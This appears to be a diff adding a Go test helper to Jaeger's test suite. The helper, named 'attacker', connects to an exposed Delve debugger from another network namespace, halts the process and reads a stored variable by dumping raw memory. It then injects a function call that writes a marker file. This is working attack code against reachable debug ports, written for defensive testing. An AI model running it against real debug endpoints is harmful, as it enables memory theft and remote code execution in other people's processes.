@@ -1,0 +1,147 @@
+// Copyright (c) 2026 The Jaeger Authors.
+// SPDX-License-Identifier: Apache-2.0
+
+// Command attacker is a Delve JSON-RPC client. It is built against the
+// Delve module version shipped in the debug base image and run from a
+// network namespace other than the debuggee's.
+package main
+
+import (
+	"encoding/binary"
+	"encoding/json"
+	"flag"
+	"fmt"
+	"net"
+	"os"
+	"strings"
+	"time"
+
+	"github.com/go-delve/delve/service/api"
+	"github.com/go-delve/delve/service/rpc2"
+)
+
+type result struct {
+	Connected    bool   `json:"connected"`
+	UID          int    `json:"uid"`
+	DialError    string `json:"dialError,omitempty"`
+	SecondClient bool   `json:"secondClient"`
+	SecondEval   string `json:"secondEval,omitempty"`
+	EvalValue    string `json:"evalValue,omitempty"`
+	Examined     string `json:"examined,omitempty"`
+	EvalError    string `json:"evalError,omitempty"`
+	ExamineError string `json:"examineError,omitempty"`
+	CallError    string `json:"callError,omitempty"`
+}
+
+func main() {
+	addr := flag.String("addr", "", "debugger listen address")
+	side := flag.String("side", "", "path the injected call should create")
+	out := flag.String("out", "", "result json path")
+	flag.Parse()
+
+	res := result{UID: os.Getuid()}
+	defer func() {
+		b, err := json.Marshal(res)
+		if err != nil {
+			return
+		}
+		_ = os.WriteFile(*out, b, 0o644)
+	}()
+
+	conn, err := net.DialTimeout("tcp", *addr, 5*time.Second)
+	if err != nil {
+		res.DialError = err.Error()
+		return
+	}
+	res.Connected = true
+	client := rpc2.NewClientFromConn(conn)
+	defer client.Disconnect(false)
+
+	// A debuggee that has not been continued is already stopped. Halt is
+	// what stops one that was started with --continue.
+	_, _ = client.Halt()
+	id := selectRunning(client)
+	if id == 0 {
+		resumeAndHalt(client, *addr)
+		id = selectRunning(client)
+	}
+	if id == 0 {
+		res.CallError = "no running goroutine"
+		return
+	}
+	if _, err := client.SwitchGoroutine(id); err != nil {
+		res.EvalError = "switch: " + err.Error()
+		return
+	}
+
+	if conn2, err2 := net.DialTimeout("tcp", *addr, 5*time.Second); err2 == nil {
+		other := rpc2.NewClientFromConn(conn2)
+		v, ev := other.EvalVariable(api.EvalScope{GoroutineID: id}, "main.StoredTrace", api.LoadConfig{MaxStringLen: 128})
+		if ev == nil && v != nil {
+			res.SecondClient = true
+			res.SecondEval = v.Value
+		}
+		_ = other.Disconnect(false)
+	}
+
+	v, err := client.EvalVariable(api.EvalScope{GoroutineID: id}, "main.StoredTrace", api.LoadConfig{MaxStringLen: 128})
+	if err != nil {
+		res.EvalError = err.Error()
+	} else if v != nil {
+		res.EvalValue = v.Value
+		header, _, herr := client.ExamineMemory(v.Addr, 16)
+		if herr != nil {
+			res.ExamineError = herr.Error()
+		} else if len(header) >= 8 {
+			ptr := binary.NativeEndian.Uint64(header[:8])
+			mem, _, merr := client.ExamineMemory(ptr, int(v.Len))
+			if merr != nil {
+				res.ExamineError = merr.Error()
+			} else {
+				res.Examined = string(mem)
+			}
+		}
+	}
+
+	client.SetReturnValuesLoadConfig(&api.LoadConfig{MaxStringLen: 64})
+	if _, err := client.Call(id, fmt.Sprintf("main.WriteMarker(%q)", *side), false); err != nil {
+		res.CallError = err.Error()
+	}
+}
+
+// resumeAndHalt continues a debuggee that is stopped at startup, then
+// halts it once a user goroutine is scheduled. The remote-storage debug
+// image omits --continue, so this is how a client reaches a running goroutine.
+func resumeAndHalt(client *rpc2.RPCClient, addr string) {
+	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
+	if err != nil {
+		return
+	}
+	resumer := rpc2.NewClientFromConn(conn)
+	resumer.SetReturnValuesLoadConfig(&api.LoadConfig{MaxStringLen: 64})
+	states := resumer.Continue()
+	time.Sleep(500 * time.Millisecond)
+	_, _ = client.Halt()
+	select {
+	case <-states:
+	case <-time.After(2 * time.Second):
+	}
+	_ = resumer.Disconnect(false)
+}
+
+func selectRunning(client *rpc2.RPCClient) int64 {
+	gs, _, err := client.ListGoroutines(0, 100)
+	if err != nil {
+		return 0
+	}
+	for _, g := range gs {
+		name := ""
+		if g.UserCurrentLoc.Function != nil {
+			name = g.UserCurrentLoc.Function.Name()
+		}
+		if strings.Contains(name, "main.main") && g.ThreadID != 0 {
+			return g.ID
+		}
+	}
+	return 0
+}
